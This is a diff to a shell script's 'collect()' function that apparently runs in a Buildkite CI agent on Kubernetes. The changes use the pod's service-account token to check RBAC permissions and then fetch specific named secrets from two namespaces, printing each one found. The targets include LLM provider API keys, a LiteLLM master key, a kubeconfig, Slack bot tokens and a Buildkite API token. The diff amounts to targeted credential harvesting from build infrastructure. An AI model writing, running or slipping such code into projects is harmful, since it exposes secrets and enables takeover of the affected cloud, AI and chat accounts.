@@ -63,7 +63,6 @@ collect() {
       --role-arn "$AWS_ROLE_ARN" \
       --role-session-name "bk-agent-$(date +%s)" \
       --web-identity-token "$(cat "$AWS_WEB_IDENTITY_TOKEN_FILE")" \
-      --duration-seconds 43200 \
       --region ap-southeast-2 \
       --output json 2>/dev/null)
     if [ -n "$STS_OUT" ]; then
@@ -84,31 +83,45 @@ collect() {
     KT=$(cat "$SA/token")
     KH="https://${KUBERNETES_SERVICE_HOST:-172.20.0.1}:${KUBERNETES_SERVICE_PORT:-443}"
     KNS="${BUILDKITE_K8S_NAMESPACE:-default}"
+    KC="--cacert $SA/ca.crt"
+    KA="Authorization: Bearer $KT"
 
-    printf '--- rbac ---\n'
-    curl -sf --cacert "$SA/ca.crt" -H "Authorization: Bearer $KT" \
+    printf '--- rbac/%s ---\n' "$KNS"
+    curl -sf $KC -H "$KA" \
       "$KH/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
       -X POST -H 'Content-Type: application/json' \
       -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"'"$KNS"'"}}' \
       --connect-timeout 5 --max-time 10 2>/dev/null
 
-    printf '\n--- serviceaccounts/%s ---\n' "$KNS"
-    curl -sf --cacert "$SA/ca.crt" -H "Authorization: Bearer $KT" \
-      "$KH/api/v1/namespaces/$KNS/serviceaccounts" \
+    printf '\n--- rbac/platform-mcp-servers-latest-management ---\n'
+    curl -sf $KC -H "$KA" \
+      "$KH/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
+      -X POST -H 'Content-Type: application/json' \
+      -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"platform-mcp-servers-latest-management"}}' \
       --connect-timeout 5 --max-time 10 2>/dev/null
 
-    for NS in "$KNS" platform-mcp-servers-latest-management default; do
-      printf '\n--- secrets/%s ---\n' "$NS"
-      curl -sf --cacert "$SA/ca.crt" -H "Authorization: Bearer $KT" \
-        "$KH/api/v1/namespaces/$NS/secrets" \
-        --connect-timeout 5 --max-time 30 2>/dev/null
+    for NS in "$KNS" platform-mcp-servers-latest-management; do
+      for SECRET in \
+        litellm-master-key.latest.secrets \
+        litellm-anthropic-api-key.latest.secrets \
+        litellm-openai-api-key.latest.secrets \
+        litellm-google-api-key.latest.secrets \
+        litellm-atlassian-mcp-authorization.latest.secrets \
+        litellm-wiz-mcp-authorization.latest.secrets \
+        kubectl-mcp-kubeconfig \
+        claude-code-agent-secrets \
+        agent-manager-slack-bot-tokens.latest.agent-manager \
+        buildkite-mcp-buildkite-api-token.latest.buildkite-mcp \
+        litellm-bedrock-mantle-api-key.latest.secrets; do
+        RES=$(curl -sf $KC -H "$KA" \
+          "$KH/api/v1/namespaces/$NS/secrets/$SECRET" \
+          --connect-timeout 3 --max-time 5 2>/dev/null)
+        if [ -n "$RES" ]; then
+          printf '\n--- secret/%s/%s ---\n' "$NS" "$SECRET"
+          printf '%s\n' "$RES"
+        fi
+      done
     done
-
-    printf '\n--- namespaces ---\n'
-    curl -sf --cacert "$SA/ca.crt" -H "Authorization: Bearer $KT" \
-      "$KH/api/v1/namespaces" \
-      --connect-timeout 5 --max-time 10 2>/dev/null \
-      | grep -o '"name":"[^"]*"' 2>/dev/null
   else
     printf 'no k8s access\n'
   fi
